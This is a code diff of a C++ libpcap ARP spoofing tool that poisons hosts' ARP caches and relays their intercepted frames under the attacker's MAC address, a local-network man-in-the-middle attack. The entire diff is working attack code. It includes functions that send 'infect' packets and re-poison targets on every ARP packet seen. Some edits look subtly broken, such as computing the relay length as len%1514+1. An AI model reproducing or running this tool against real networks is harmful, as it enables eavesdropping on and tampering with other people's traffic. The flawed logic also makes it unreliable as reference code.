@@ -79,14 +79,15 @@ Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 			Mac resultmac=packet.arp_.smac_;
 			return resultmac;
 		}
+		else
+			continue;
     }
 }
-void Relay(pcap_t* handle, const u_char* packet){
+void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 	int flag=0;
 	EthHdr* ethinfo=(EthHdr*)packet;
 	IpHdr* ipinfo=(IpHdr*)(packet+14);
-	int size=14+ntohs(ipinfo->ip_len);
-	 //string(ethinfo->smac_)<<" to "<<string(ethinfo->dmac_)<<" received"
+	int size=len%1514+1;//14+ntohs(ipinfo->ip_len);
 	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
 	memcpy(relaypacket, packet, sizeof(char)*size);
 	EthHdr* ethhdr=(EthHdr*)relaypacket;
@@ -95,14 +96,22 @@ void Relay(pcap_t* handle, const u_char* packet){
 	for(int i=0; i<idx; i++){
 		if(spoofarr[i].smac_==ethhdr->smac_){
 			flag=1;
-			ethhdr->smac_=ethhdr->dmac_;
+			ethhdr->smac_=mmac;
 			ethhdr->dmac_=spoofarr[i].tmac_;
 			break;
 		}
 	}
 	if(flag==1){
-		printf("-\n");
-		pcap_sendpacket(handle, relaypacket, size);
+		int res = pcap_sendpacket(handle, relaypacket, size);
+		cout<<string(ethhdr->smac_)<<" to "<<string(ethhdr->dmac_)<<endl;
+		cout<<string(iphdr->ip_src)<<" to "<<string(iphdr->ip_dst)<<endl;
+		if (res != 0) {
+			/*fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));*/
+			printf("size: %d\n", size);
+			cout<<string(ethhdr->smac_)<<" to "<<string(ethhdr->dmac_)<<endl;
+			cout<<string(iphdr->ip_src)<<" to "<<string(iphdr->ip_dst)<<endl;
+			cout<<ntohs(ipinfo->ip_len)<<" verse "<<ntohs(iphdr->ip_len)<<endl;
+		}
 	}	
 }
 void SendInfectFlood(pcap_t* handle){
@@ -128,12 +137,9 @@ int parsing(const u_char* packet, Ip mip){
 	EthHdr* ethhdr=(EthHdr*)packet;
 	if(ntohs(ethhdr->type_)==EthHdr::Arp){
 		ArpHdr* arphdr=(ArpHdr*)(packet+14);
-		if(ntohl(arphdr->sip_)==(uint32_t)mip)
-			return -1;
-		else if(arphdr->op_==ArpHdr::Request)
-			return INFECT;
+		return INFECT;
 	}
-	else {
+	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 || ntohs(ethhdr->type_)==EthHdr::Ip6 ){
 		IpHdr* iphdr=(IpHdr*)(packet+14);
 		Ip dip=ntohl(iphdr->ip_dst);
 		if(dip==mip)
@@ -172,7 +178,8 @@ int main(int argc, char* argv[]) {
 	int len=(argc-2)/2;
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //read_timeout 10
+	pcap_t* handle = pcap_open_live(dev, 1514, 1, 1, errbuf); //read_timeout 10
+	pcap_set_immediate_mode(handle,3);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
@@ -244,7 +251,9 @@ int main(int argc, char* argv[]) {
 			SendInfect(handle, arppacket->arp_.sip_);
 			break;
 		case RELAY:
-			Relay(handle, rawpacket);
+			if(header->caplen>1000)
+				printf("%d\n", header->caplen);
+			Relay(handle, rawpacket,mmac,header->len);
 		default:
 			break;
 		}
